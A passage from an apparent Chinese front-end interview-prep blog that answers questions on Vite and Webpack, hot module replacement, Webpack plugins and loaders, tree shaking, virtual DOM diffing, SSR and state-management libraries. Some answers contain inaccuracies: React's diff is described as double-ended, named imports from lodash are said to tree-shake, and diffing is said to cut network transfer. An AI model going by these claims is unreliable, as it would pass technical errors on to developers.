<li>Vite：Vite 使用“按需编译”的方式，只在需要时编译相关模块。它通过 ES 模块的引入来实现，因此在开发过程中只加载需要的模块，加快了构建速度。</li>
</ul>
</li>
<li><p><strong>开发体验：</strong></p>
<ul>
<li>Webpack：Webpack 提供了丰富的插件和加载器，可以处理各种不同的任务。但配置较为复杂，需要熟悉各种配置选项。</li>
<li>Vite：Vite 的配置更加简单和直观，无需繁琐的配置文件。它支持现代的开发工具如 Vue、React、TypeScript 等，并默认支持热更新。</li>
</ul>
</li>
<li><p><strong>生态系统：</strong></p>
<ul>
<li>Webpack：Webpack 有一个庞大的生态系统，有丰富的插件和加载器，适用于各种应用场景。</li>
<li>Vite：Vite 的生态系统相对较新，但也在不断增长。它默认支持 Vue，但对于其他框架也有插件支持。</li>
</ul>
</li>
<li><p><strong>适用场景：</strong></p>
<ul>
<li>Webpack：适用于大型、复杂的项目，需要丰富的插件和加载器，以及定制化的构建流程。</li>
<li>Vite：适用于快速原型开发、小到中型的项目，以及对开发体验要求较高的场景。</li>
</ul>
</li>
</ol>
<p>综上所述，Webpack 和 Vite 都是优秀的构建工具，选择哪一个取决于项目的需求和个人喜好。对于大型项目或需要更多定制化的项目，Webpack 仍然是一个强大的选择。而对于快速原型开发和对开发体验要求较高的项目，Vite 提供了更快的构建速度和更简单的配置。在实际项目中，有时也可以考虑两者结合使用，例如使用 Vite 作为开发环境，而将生产构建交给 Webpack 处理。</p>
<h5 id="vite的热更新是怎么实现的"><a href="#vite的热更新是怎么实现的" class="headerlink" title="vite的热更新是怎么实现的"></a>vite的热更新是怎么实现的</h5><p>Vite的热更新是通过其内置的开发服务器和ES模块的特性实现的。以下是Vite热更新的工作原理：</p>
<ol>
<li><p><strong>开发服务器：</strong> Vite使用内置的开发服务器来提供热更新功能。该服务器能够在开发过程中动态提供更新的代码，而无需完全重新加载整个页面。</p>
</li>
<li><p><strong>ES模块（ESM）：</strong> Vite利用了现代浏览器对ES模块的原生支持。在Vite项目中，所有的JavaScript模块都被当作ES模块处理。</p>
</li>
<li><p><strong>HMR（热模块替换）：</strong> Vite使用HMR技术来实现热更新。HMR允许在应用程序运行时替换、添加或删除模块，而无需重新加载整个页面。这意味着只有发生更改的模块会被替换，而不会影响其他部分。</p>
</li>
<li><p><strong>WebSocket通信：</strong> Vite的开发服务器使用WebSocket与浏览器建立实时连接，以便在发生更改时能够快速通知浏览器。</p>
</li>
<li><p><strong>依赖分析：</strong> Vite能够分析模块之间的依赖关系，当某个模块发生更改时，它能够确定哪些模块受到影响，并将这些模块的更新推送到浏览器。</p>
</li>
<li><p><strong>客户端更新：</strong> 当开发者保存文件时，Vite会重新构建受影响的模块，并将更新的模块代码发送到浏览器。浏览器收到更新后，会使用HMR机制将新模块替换为旧模块，从而实现实时更新。</p>
</li>
</ol>
<p>总的来说，Vite的热更新是通过结合ES模块、HMR技术和WebSocket通信来实现的。这种方式使得开发者能够在开发过程中实时看到代码变更的效果，极大地提高了开发效率。不需要重新加载整个应用程序，只需更新受影响的模块，这使得热更新非常快速。</p>
<h5 id="webpack的plngin是怎么实现插件化的机制的"><a href="#webpack的plngin是怎么实现插件化的机制的" class="headerlink" title="webpack的plngin是怎么实现插件化的机制的"></a>webpack的plngin是怎么实现插件化的机制的</h5><p>Webpack 插件的实现机制基于 Node.js 的模块化和事件驱动的特性，通过以下方式实现插件化的机制：</p>
<ol>
<li><p><strong>模块化：</strong> Webpack 插件是基于 Node.js 模块化的。每个插件通常是一个 Node.js 模块，可以通过 CommonJS 或 ES6 模块语法导出一个插件类或函数。</p>
</li>
<li><p><strong>事件驱动：</strong> Webpack 在构建过程中触发了一系列的事件，插件可以监听这些事件并在事件发生时执行自定义的逻辑。Webpack 插件系统基于事件驱动模式，允许插件在不同的构建阶段插入自己的处理逻辑。</p>
</li>
<li><p><strong>生命周期钩子：</strong> Webpack 定义了一系列的生命周期钩子，代表了构建过程中的不同阶段。插件可以通过订阅这些生命周期钩子来执行自己的任务。例如，<code>beforeCompile</code> 钩子表示编译前的事件，<code>emit</code> 钩子表示即将输出文件的事件。</p>
</li>
<li><p><strong>事件参数：</strong> Webpack 在触发事件时会传递一个事件参数对象，该对象包含了与当前事件相关的信息。插件可以通过这个参数对象获取有关构建过程的详细信息，例如输入文件、输出文件、模块等。</p>
</li>
<li><p><strong>Tapable：</strong> Webpack 使用 Tapable 这个库来实现插件系统。Tapable 提供了一套事件订阅和发布的机制，使插件可以订阅并响应不同的事件。</p>
</li>
</ol>
<p>下面是一个简单的示例，展示了如何创建一个简单的 Webpack 插件并监听构建阶段的事件：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyWebpackPlugin</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">options</span>) &#123;<br>    <span class="hljs-comment">// 插件配置选项可以在构造函数中接收</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span> = options;<br>  &#125;<br><br>  <span class="hljs-title function_">apply</span>(<span class="hljs-params">compiler</span>) &#123;<br>    <span class="hljs-comment">// 注册事件监听器，监听构建阶段的事件</span><br>    compiler.<span class="hljs-property">hooks</span>.<span class="hljs-property">emit</span>.<span class="hljs-title function_">tapAsync</span>(<span class="hljs-string">&#x27;MyWebpackPlugin&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">compilation, callback</span>) =&gt;</span> &#123;<br>      <span class="hljs-comment">// 在 emit 阶段执行自定义逻辑</span><br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;MyWebpackPlugin is running&#x27;</span>);<br>      <br>      <span class="hljs-comment">// 执行完逻辑后调用 callback 通知 Webpack 继续构建流程</span><br>      <span class="hljs-title function_">callback</span>();<br>    &#125;);<br>  &#125;<br>&#125;<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-title class_">MyWebpackPlugin</span>;<br></code></pre></td></tr></table></figure>

<p>在上面的示例中，我们创建了一个名为 <code>MyWebpackPlugin</code> 的插件，它监听了 Webpack 的 <code>emit</code> 事件。当 <code>emit</code> 事件触发时，插件会执行自定义逻辑。这个示例展示了 Webpack 插件的基本结构和事件监听机制。</p>
<p>通过这些机制，Webpack 插件系统实现了插件化的机制，允许开发者编写自定义的插件来扩展和定制 Webpack 的构建行为。每个插件可以根据需要监听不同的事件，执行各种任务，从而实现了灵活的构建流程定制。</p>
<h5 id="webapck的插件里面有同步插件和异步插件，那你觉得这是如何保证插件的执行顺序而不影响你的主流程。"><a href="#webapck的插件里面有同步插件和异步插件，那你觉得这是如何保证插件的执行顺序而不影响你的主流程。" class="headerlink" title="webapck的插件里面有同步插件和异步插件，那你觉得这是如何保证插件的执行顺序而不影响你的主流程。"></a>webapck的插件里面有同步插件和异步插件，那你觉得这是如何保证插件的执行顺序而不影响你的主流程。</h5><p>在 Webpack 插件系统中，确保插件的执行顺序而不影响主流程可以通过 Webpack 插件的执行机制来实现。Webpack 插件的执行顺序主要受以下两个因素影响：</p>
<ol>
<li><p><strong>插件注册顺序：</strong> 插件的注册顺序会影响它们的执行顺序。通常情况下，Webpack 插件是按照注册的先后顺序执行的，即先注册的插件会先执行，后注册的插件会后执行。</p>
</li>
<li><p><strong>Webpack 执行流程：</strong> Webpack 有一个明确的构建流程，包括诸如初始化、编译、输出文件等阶段。插件可以根据这些阶段的生命周期钩子来执行操作。Webpack 的生命周期钩子允许插件在不同的构建阶段注册回调函数，以便在合适的时机执行。</p>
</li>
</ol>
<p>通过合理地注册插件并使用Webpack提供的生命周期钩子，可以实现对插件的执行顺序进行精确控制。以下是一些常见的插件控制执行顺序的方式：</p>
<ol>
<li><p><strong>注册顺序控制：</strong> 如果需要确保某个插件在另一个插件之前或之后执行，可以根据注册顺序进行控制。将需要在前执行的插件早于其他插件注册，将需要在后执行的插件晚于其他插件注册。</p>
</li>
<li><p><strong>生命周期钩子控制：</strong> Webpack 提供了多个生命周期钩子，如 <code>beforeCompile</code>、<code>emit</code>、<code>afterEmit</code> 等。插件可以根据这些生命周期钩子注册回调函数，以在不同的构建阶段执行操作。通过选择合适的生命周期钩子，可以实现对插件执行顺序的精细控制。</p>
</li>
<li><p><strong>异步操作：</strong> 对于某些需要异步执行的操作，可以使用异步操作，如Promise或回调函数，来确保在异步操作完成后再执行其他插件的逻辑。这可以避免异步操作的结果影响到其他插件的执行。</p>
</li>
</ol>
<p>需要注意的是，Webpack 插件系统默认按照注册顺序执行插件，但某些插件可能会在异步操作中执行一些任务，因此在处理异步插件时需要格外小心，确保异步操作完成后再执行下一个插件。</p>
<p>总之，通过合理注册插件、使用Webpack提供的生命周期钩子以及处理异步操作，可以确保插件在不影响主流程的情况下按照预期的顺序执行。这样可以更好地控制构建过程，并实现各种自定义的构建逻辑。</p>
<h5 id="webpack的loader这一块处理前端样式是多个loader，执行顺序是"><a href="#webpack的loader这一块处理前端样式是多个loader，执行顺序是" class="headerlink" title="webpack的loader这一块处理前端样式是多个loader，执行顺序是"></a>webpack的loader这一块处理前端样式是多个loader，执行顺序是</h5><p>在 Webpack 中，处理前端样式通常需要使用多个 Loader，例如处理 CSS、Sass、Less、PostCSS 等不同类型的样式文件。Loader 的执行顺序是从右到左（或从下到上，取决于配置文件中的顺序），也就是说，最右边（或最下面）的 Loader 最先执行，然后依次向左（或向上）执行。这种执行顺序允许你将不同的转换和处理逻辑组合在一起，以满足项目的需求。</p>
<p>以下是一个示例 Webpack 配置，展示了多个 Loader 的执行顺序：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">module</span>: &#123;<br>    <span class="hljs-attr">rules</span>: [<br>      &#123;<br>        <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.scss$/</span>, <span class="hljs-comment">// 匹配以 .scss 结尾的文件</span><br>        <span class="hljs-attr">use</span>: [<br>          <span class="hljs-string">&#x27;style-loader&#x27;</span>, <span class="hljs-comment">// 最后执行的 Loader，将 CSS 注入到页面中</span><br>          <span class="hljs-string">&#x27;css-loader&#x27;</span>,   <span class="hljs-comment">// 先执行的 Loader，用于解析 CSS 文件</span><br>          <span class="hljs-string">&#x27;sass-loader&#x27;</span>   <span class="hljs-comment">// 先执行的 Loader，用于编译 Sass 文件</span><br>        ]<br>      &#125;,<br>      &#123;<br>        <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.js$/</span>, <span class="hljs-comment">// 匹配以 .js 结尾的文件</span><br>        <span class="hljs-attr">use</span>: <span class="hljs-string">&#x27;babel-loader&#x27;</span> <span class="hljs-comment">// 使用 Babel 进行 JavaScript 代码转换</span><br>      &#125;<br>    ]<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>在上述示例中，针对 <code>.scss</code> 文件的处理顺序是：</p>
<ol>
<li><code>sass-loader</code> 先执行，用于编译 Sass 文件成为 CSS。</li>
<li><code>css-loader</code> 接下来执行，用于解析 CSS 文件，处理 <code>@import</code> 和 <code>url()</code> 等语法。</li>
<li>最后是 <code>style-loader</code>，它将处理后的 CSS 注入到页面中。</li>
</ol>
<p>这种顺序确保了样式文件经过正确的处理和转换后再被应用到页面上。</p>
<p>需要注意的是，虽然 Loader 的执行顺序是从右到左（或从下到上），但在实际配置中也可以根据需求调整 Loader 的顺序，以满足不同的项目要求。因此，Loader 的执行顺序可以根据具体情况进行调整和定制。</p>
<h5 id="webpack做过哪些优化"><a href="#webpack做过哪些优化" class="headerlink" title="webpack做过哪些优化"></a>webpack做过哪些优化</h5><p>Webpack 是一个非常强大的模块打包器，它可以帮助开发者处理代码依赖、打包、压缩等任务。在使用 Webpack 的过程中，我们可以通过一些方法优化项目，提高性能和用户体验。以下是一些常见的 Webpack 优化方法：</p>
<ol>
<li>Tree shaking：通过此技术，Webpack 可以消除未使用的代码，从而减少最终包的大小。为了实现这一点，确保在 package.json 文件中设置 “sideEffects” 选项。</li>
<li>代码分割（Code Splitting）：将代码分割成不同的 chunks，从而实现按需加载和并行加载。这可以减少首次加载时间和浏览器解析时间。可以使用 SplitChunksPlugin 和动态 import() 实现代码分割。</li>
<li>懒加载（Lazy Loading）：懒加载是一种按需加载策略，只有在实际需要时才加载某些代码。这可以显著减少首屏加载时间。</li>
<li>使用缓存：通过设置 cache-loader、HardSourceWebpackPlugin 或其他缓存插件，可以利用缓存加快构建速度。</li>
<li>压缩代码：使用插件如 TerserPlugin（用于 JavaScript）和 MiniCssExtractPlugin（用于 CSS）对代码进行压缩，减少代码体积，提高加载速度。</li>
<li>使用 DLL：通过使用 DllPlugin 和 DllReferencePlugin，可以将第三方库与应用程序代码分离，从而减少构建时间。</li>
<li>配置 resolve.alias：通过配置 resolve.alias，可以缩短查找模块的路径，从而提高构建速度。</li>
<li>使用 Web Workers 或 Service Workers：通过将一些任务放在后台线程中处理，可以提高应用程序的性能。</li>
<li>提取 CSS：通过使用 MiniCssExtractPlugin，可以将 CSS 从 JS 中分离出来，提高加载性能。</li>
<li>使用 Loaders 和 Babel：通过配置不同的 loaders 和 Babel 插件，可以在构建过程中优化代码，例如转换 ES6 语法、移除 console.log 等。</li>
<li>配置性能提示：通过配置 performance.hints 和 performance.assetFilter，可以监控和优化构建产物的大小。</li>
<li>使用 Webpack Bundle Analyzer：通过这个插件，可以分析和可视化 Webpack 输出的文件，从而帮助发现潜在的优化点。</li>
</ol>
<p>这些是在使用 Webpack 时可以采取的一些优化方法。针对具体项目，可能还需要结合实际情况进行更多优化。</p>
<h5 id="Wepback5有哪些新特性？"><a href="#Wepback5有哪些新特性？" class="headerlink" title="Wepback5有哪些新特性？"></a>Wepback5有哪些新特性？</h5><ol>
<li>持久缓存：Webpack 5 引入了文件系统缓存，可以在多次构建之间持久存储中间结果。这可以显著提高重复构建的速度。</li>
<li>模块联邦（Module Federation）：这是一个允许多个独立构建共享代码的新特性。模块联邦可以在不牺牲性能的情况下实现微前端架构。</li>
<li>更好的 Tree Shaking：Webpack 5 改进了 Tree Shaking，可以更有效地移除无用代码。</li>
<li>默认支持 Content Hash：现在默认为输出文件名添加内容哈希，以实现长期缓存优化。</li>
<li>更小的运行时代码：Webpack 5 的运行时代码更小，有助于减小最终生成的包的大小。</li>
<li>改进的代码分割策略：Webpack 5 对 SplitChunksPlugin 的默认配置进行了优化，以更好地支持公共代码的提取。</li>
<li>移除了一些过时的特性：Webpack 5 移除了一些不推荐使用的特性，如 Node.js 的 polyfill。</li>
</ol>
<h3 id="3、lodash支持tree-shaking吗？为什么？tree-shaking原理？"><a href="#3、lodash支持tree-shaking吗？为什么？tree-shaking原理？" class="headerlink" title="3、lodash支持tree-shaking吗？为什么？tree-shaking原理？"></a>3、lodash支持tree-shaking吗？为什么？tree-shaking原理？</h3><p>lodash 在一定程度上支持 Tree Shaking，但不是完全支持。Tree Shaking 是一种 JavaScript 模块打包优化技术，它的目标是在构建过程中去除未使用的代码（未引用的模块或导出），以减小最终生成的包的大小。这使得只有实际用到的代码会被打包到最终的应用程序中，从而减小了文件大小，提高了性能。</p>
<p>在 lodash 中，每个函数都是一个单独的模块，这意味着您可以使用 Tree Shaking 来选择性地导入和使用 lodash 中的函数。例如，如果您只使用了 <code>lodash</code> 中的 <code>map</code> 函数，可以这样导入：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> &#123; map &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;lodash&#x27;</span>;<br></code></pre></td></tr></table></figure>

<p>然后，通过 Tree Shaking，只有 <code>map</code> 函数会被包含在最终的构建输出中。</p>
<p>然而，lodash 也有一些部分不容易被 Tree Shaking 优化的地方，这主要是因为 lodash 中的一些功能是通过链式调用或运行时配置生成的，这些特性使得某些 lodash 模块难以被静态地分析和优化。例如，如果您使用了 lodash 的链式调用风格的 <code>_.chain</code> 方法，那么可能会导致整个 lodash 库被包含在构建输出中，即使只使用了其中的一部分功能。</p>
<p>Tree Shaking 的原理涉及到静态分析和依赖图的构建。通常，构建工具（例如 Webpack）会分析代码中的 import 和 export 语句，然后根据依赖关系确定哪些模块是未引用的，然后将这些未引用的模块从最终的构建输出中移除。这个过程要求模块系统和构建工具能够正确识别模块之间的依赖关系，并进行智能地剪裁未使用的代码。</p>
<p>总之，虽然 lodash 在一定程度上支持 Tree Shaking，但要注意一些链式调用等特性可能会导致一些未使用的代码被保留在构建输出中。因此，在使用 lodash 或其他库时，建议查看文档以了解如何最大程度地利用 Tree Shaking 进行代码优化。</p>
<h3 id="4、为什么Vue和React要有diff算法"><a href="#4、为什么Vue和React要有diff算法" class="headerlink" title="4、为什么Vue和React要有diff算法"></a>4、为什么Vue和React要有diff算法</h3><p>Vue和React都是流行的JavaScript库，用于构建用户界面。它们之所以需要有diff算法，是因为在实际开发中，页面的数据和状态经常会发生变化，为了高效地更新页面视图，需要有一种方法来比较新旧状态并计算出最小的更新操作。</p>
<p>以下是深入回答为什么Vue和React需要有diff算法的原因：</p>
<ol>
<li><p><strong>性能优化：</strong> 在一个动态的Web应用中，频繁地更新DOM元素是一项昂贵的操作。如果每次数据变化都重新渲染整个界面，会导致性能问题，因此需要一种方法来仅更新发生变化的部分，以提高性能。</p>
</li>
<li><p><strong>减少重绘和重排：</strong> 浏览器的渲染过程包括重排（Reflow）和重绘（Repaint）操作，它们都会消耗大量的计算资源。diff算法可以帮助减少这些操作的次数，从而减轻了浏览器的负担。</p>
</li>
<li><p><strong>减少网络传输：</strong> 在一些情况下，前端应用从服务器获取数据，如果可以仅传输发生变化的数据部分，可以减少网络带宽的使用。diff算法有助于确定哪些数据已经在客户端，哪些数据需要从服务器获取。</p>
</li>
<li><p><strong>提高用户体验：</strong> 页面快速响应是提高用户体验的关键因素之一。通过只更新必要的部分，可以确保用户界面保持流畅和快速的响应，不会因数据变化而出现卡顿或闪烁。</p>
</li>
<li><p><strong>节省内存：</strong> 如果每次数据变化都创建新的DOM元素，会导致内存占用不断增加。diff算法可以帮助重用已经存在的DOM元素，减少内存占用。</p>
</li>
<li><p><strong>提高开发效率：</strong> 在大型应用中，手动管理DOM更新是一项复杂的任务，容易出错。有了diff算法，开发人员可以更容易地编写高效的代码，而不必担心手动处理DOM操作。</p>
</li>
</ol>
<p>总之，Vue和React之所以需要有diff算法，是为了优化性能、减少资源消耗、提高用户体验和提高开发效率。这些库的diff算法可以智能地比较新旧状态，只更新必要的部分，以确保页面在数据变化时能够快速而高效地响应。这对于构建现代、高性能的Web应用至关重要。</p>
<h5 id="react的diff算法细节"><a href="#react的diff算法细节" class="headerlink" title="react的diff算法细节"></a>react的diff算法细节</h5><p>React 的 Virtual DOM（虚拟 DOM）和 Diff 算法是 React 性能优化的关键。以下是 React Diff 算法的一些关键细节：</p>
<ol>
<li><p><strong>虚拟 DOM：</strong> React 使用虚拟 DOM 表示真实 DOM 的树结构。当组件状态变化时，React 不会立即操作真实 DOM，而是先在内存中构建一个新的虚拟 DOM 树，然后将新旧虚拟 DOM 树进行比较。</p>
</li>
<li><p><strong>Diff 策略：</strong> React 的 Diff 算法采用了双端比较策略，即同时从新虚拟 DOM 树的头部和尾部开始比较，以找到最小更新路径。这可以减少比较次数，提高性能。</p>
</li>
<li><p><strong>Key 属性：</strong> React 鼓励每个列表项（如数组中的元素）添加一个唯一的 <code>key</code> 属性。这个 <code>key</code> 属性可以帮助 React 更精确地找到新旧虚拟 DOM 树中相对应的节点，从而避免不必要的更新。使用 <code>key</code> 可以有效地处理列表项的增删操作。</p>
</li>
<li><p><strong>三种操作：</strong> React 的 Diff 算法将节点更新分为三种操作：插入、更新和删除。当比较新旧虚拟 DOM 树时，算法会识别出哪些节点需要插入到真实 DOM 中、哪些节点需要更新、哪些节点需要删除。</p>
</li>
<li><p><strong>Diff 算法复杂度：</strong> 新旧虚拟DOM对比的时候，Diff算法比较只会在同层级进行, 不会跨层级比较。 所以Diff算法是:<code>深度优先算法</code>。 时间复杂度:<code>O(n)</code>，其中 n 表示虚拟 DOM 树中节点的数量。这意味着算法的性能是线性的，与节点数量成正比，因此可以高效地处理大型应用中的 DOM 更新。</p>
</li>
<li><p><strong>组件更新策略：</strong> React 通过组件的生命周期方法来决定何时进行组件的重新渲染。组件更新不一定会导致真实 DOM 的更新，React 会智能地选择何时进行虚拟 DOM 的比较和真实 DOM 的更新，以提高性能。</p>
</li>
</ol>
<p>总之，React 的 Diff 算法是一个高效的、基于虚拟 DOM 的算法，它通过智能的比较策略和 <code>key</code> 属性的利用，可以有效地减少不必要的 DOM 更新操作，提高应用的性能和响应速度。这使得 React 成为构建高性能、可维护的用户界面的强大工具。</p>
<h5 id="diff实现"><a href="#diff实现" class="headerlink" title="diff实现"></a>diff实现</h5><p>虚拟 DOM 和前端框架通常使用 diff 算法来比较两个虚拟 DOM 树（或树的节点），以确定需要进行的 DOM 更新操作，从而提高页面性能。下面是一种常见的 diff 算法的简要工作原理：</p>
<ol>
<li><p><strong>比较树的根节点</strong>：算法首先比较两个虚拟 DOM 树的根节点，以确定它们是否相同。如果根节点不同，则整个树被标记为需要替换，算法将创建新的实际 DOM 元素并替换旧的元素。</p>
</li>
<li><p><strong>递归比较子节点</strong>：如果两个根节点相同，算法会递归比较它们的子节点。这个递归过程会深入到虚拟 DOM 树的每个分支，并比较它们的节点。</p>
</li>
<li><p><strong>同级元素比较</strong>：在递归中，算法会比较同一级别的节点，确定它们是否相同。算法会尽早地检测到不同，从而避免深入比较不必要的子节点。</p>
</li>
<li><p><strong>更新策略</strong>：一旦发现两个节点不同，算法会采取不同的更新策略，具体取决于框架和应用程序的需求。常见的更新策略包括：</p>
<ul>
<li>替换节点：完全替换一个节点及其子节点。</li>
<li>更新节点：只更新节点的属性或文本内容，而不替换子节点。</li>
<li>移动节点：将一个节点从一个位置移动到另一个位置，而不创建新节点。</li>
<li>删除节点：从 DOM 中删除一个节点，或标记为需要删除。</li>
</ul>
</li>
<li><p><strong>最小化更新</strong>：diff 算法的目标是尽量减少 DOM 更新操作的数量。因此，它会尽量找到最小的一组操作来将虚拟 DOM 更新为实际 DOM，以提高性能。</p>
</li>
</ol>
<p>虽然上述是一种简要的描述，但实际的 diff 算法可能会更加复杂和优化，以应对不同的情况和性能需求。例如，React 中的 diff 算法（称为Reconciliation算法）会使用一些启发式策略来进一步优化更新过程，以减少不必要的比较和操作。</p>
<p>需要注意的是，虽然 diff 算法可以显著提高性能，但它并不是银弹，也需要开发者编写高效的应用程序代码，以最大程度地减少虚拟 DOM 树的变化。因此，在使用虚拟 DOM 和 diff 算法时，开发者仍然需要考虑应用程序的设计和数据流程，以确保性能的最佳表现。</p>
<h3 id="5、SSR了解吗"><a href="#5、SSR了解吗" class="headerlink" title="5、SSR了解吗"></a>5、SSR了解吗</h3><p>是的，我了解服务器端渲染（Server-Side Rendering，SSR）的概念和原理。服务器端渲染是一种将网页内容的生成和渲染工作从客户端转移到服务器端的Web开发技术。它与传统的客户端渲染（Client-Side Rendering，CSR）有一些重要的区别和优势。</p>
<p>以下是关于服务器端渲染的一些关键概念和特点：</p>
<ol>
<li><p><strong>页面首次加载更快：</strong> 在CSR中，浏览器需要下载HTML文件后再通过JavaScript动态渲染页面内容，因此页面的首次加载速度可能会较慢。而在SSR中，服务器会生成带有初始化数据的HTML，浏览器直接展示渲染好的页面，因此首次加载速度更快，用户能够更快地看到内容。</p>
</li>
<li><p><strong>SEO优势：</strong> 由于搜索引擎爬虫能够直接读取服务器渲染的HTML内容，SSR对搜索引擎优化（SEO）更友好。而CSR中，搜索引擎可能无法正确解析页面内容。</p>
</li>
<li><p><strong>更好的性能表现：</strong> 对于某些应用程序，SSR可以减轻客户端的负载，因为页面内容已经在服务器上渲染完成，而不是依赖客户端设备来完成渲染工作。</p>
</li>
<li><p><strong>不适用于所有场景：</strong> 尽管SSR在某些情况下有明显的优势，但并不是对所有应用都适用。一些单页面应用（SPA）可能更适合采用CSR，特别是当页面具有复杂的交互和动态性时。</p>
</li>
<li><p><strong>额外的服务器负担：</strong> 实施SSR需要服务器端的额外处理工作，包括构建和维护服务器渲染的逻辑。这可能会增加服务器的负担和开发的复杂性。</p>
</li>
<li><p><strong>使用框架：</strong> 许多现代JavaScript框架和库，如Next.js（React）、Nuxt.js（Vue）、Angular Universal（Angular）等，提供了方便的SSR支持，使开发者能够相对容易地实现服务器端渲染。</p>
</li>
</ol>
<p>总之，服务器端渲染是一种有助于提高首次加载速度、SEO优化和性能表现的Web开发技术，但它需要仔细考虑应用程序的需求和复杂性，以确定是否适合采用SSR。不同的应用场景可能需要不同的渲染方式。</p>
<h3 id="6、前端的状态管理库介绍"><a href="#6、前端的状态管理库介绍" class="headerlink" title="6、前端的状态管理库介绍"></a>6、前端的状态管理库介绍</h3><p>前端状态管理库用于管理和维护应用程序的状态，以确保组件之间可以共享和同步数据。以下是一些常见的前端状态管理库，并进行简要介绍：</p>
<ol>
<li><p><strong>Redux：</strong> Redux 是一个用于 JavaScript 应用程序的可预测状态容器。它遵循单一数据源和纯函数的原则，通过创建一个全局存储（store）来管理应用程序的状态，并使用动作（actions）和 reducers 来修改状态。Redux 是 React 生态系统中最常用的状态管理库之一。</p>
</li>
<li><p><strong>Mobx：</strong> Mobx 是一个简单、可扩展且响应式的状态管理库，适用于 React、Vue 和其他 JavaScript 框架。它基于可观察对象（observable objects）和装饰器，允许你声明性地定义状态和状态之间的依赖关系。</p>
</li>
<li><p><strong>Vuex：</strong> Vuex 是用于 Vue.js 应用程序的官方状态管理库。它提供了一个集中式的状态存储，并使用 mutations 来修改状态。Vuex 集成了 Vue 组件，使得状态管理在 Vue 应用中更加简单和一致。</p>
</li>
<li><p><strong>Mobx-State-Tree（MST）：</strong> Mobx-State-Tree 是 Mobx 的扩展，用于创建可扩展的应用程序状态树。它提供了一种方式来定义和组织状态模型，并具有强大的快照和时间旅行（time-travel）调试工具。</p>
</li>
<li><p><strong>Recoil：</strong> Recoil 是 Facebook 开发的状态管理库，专为 React 应用程序设计。它引入了原子状态（atom）和选择器（selector）的概念，使得状态管理更加灵活和高效。</p>
</li>
<li><p><strong>Ngrx：</strong> Ngrx 是 Angular 生态系统中的状态管理库，它基于 Redux 架构，用于管理 Angular 应用的状态。它提供了一组强大的工具，包括 actions、reducers 和 effects，以支持复杂的状态管理需求。</p>
</li>
<li><p><strong>Zustand：</strong> Zustand 是一个微型状态管理库，适用于 React 应用程序。它提供了一个使用 React 的 Hook API 来管理状态的简单方式，没有复杂的概念和冗余的代码。</p>
</li>
<li><p><strong>Immer：</strong> Immer 不是一个状态管理库，而是一个状态更新库，它用于以不可变的方式更新 JavaScript 对象。许多状态管理库和应用程序状态管理都受益于 Immer 的简化状态更新。</p>
</li>
</ol>
<p>这些状态管理库都有各自的优点和适用场景，开发者可以根据项目需求和团队熟悉度来选择适合的库。无论选择哪个库，良好的状态管理能够提高应用程序的可维护性和性能，并支持复杂的数据流管理。</p>
<p>mobx解析：<a target="_blank" rel="noopener" href="https://juejin.cn/post/7036354289215733791">https://juejin.cn/post/7036354289215733791</a></p>
<h5 id="对比一下Redux、Mobx、react-redux、useReducer、Mobx-State-Tree（MST）的优劣"><a href="#对比一下Redux、Mobx、react-redux、useReducer、Mobx-State-Tree（MST）的优劣" class="headerlink" title="对比一下Redux、Mobx、react redux、useReducer、Mobx-State-Tree（MST）的优劣"></a>对比一下Redux、Mobx、react redux、useReducer、Mobx-State-Tree（MST）的优劣</h5><p>以下是 Redux、Mobx、react-redux、useReducer 和 Mobx-State-Tree（MST）的优劣势对比：</p>
<p><strong>Redux:</strong></p>
<ul>
<li><p>优势：</p>
<ul>
<li>可以用于多种 JavaScript 框架，但在 React 中应用最广泛。</li>
<li>严格的单一数据源和纯函数原则，使状态变化可预测和可追踪。</li>
<li>丰富的生态系统，包括中间件、调试工具和社区支持。</li>
<li>适合大型复杂应用程序，因为它提供了强大的工具来管理状态流。</li>
</ul>
</li>
<li><p>劣势：</p>
<ul>
<li>有一定的学习曲线，需要理解 Redux 的概念和约定。</li>
<li>需要编写大量的样板代码，如 action 和 reducer。</li>
<li>可能会导致状态树过于冗长和复杂。</li>
</ul>
</li>
</ul>
<p><strong>Mobx:</strong></p>
<ul>
<li><p>优势：</p>
<ul>
<li>简单、直观，适合快速开发原型或小型项目。</li>
<li>支持响应式编程，状态自动更新。</li>
<li>支持多种框架，包括 React、Vue 和 Angular。</li>
</ul>
</li>
<li><p>劣势：</p>
<ul>
<li>可能会导致状态变得不可控，难以调试。</li>
<li>不够严格，可能会导致性能问题和意外行为。</li>
<li>缺少官方的调试工具和标准化的最佳实践。</li>
</ul>
</li>
</ul>
<p><strong>react-redux:</strong></p>
<ul>
<li><p>优势：</p>
<ul>
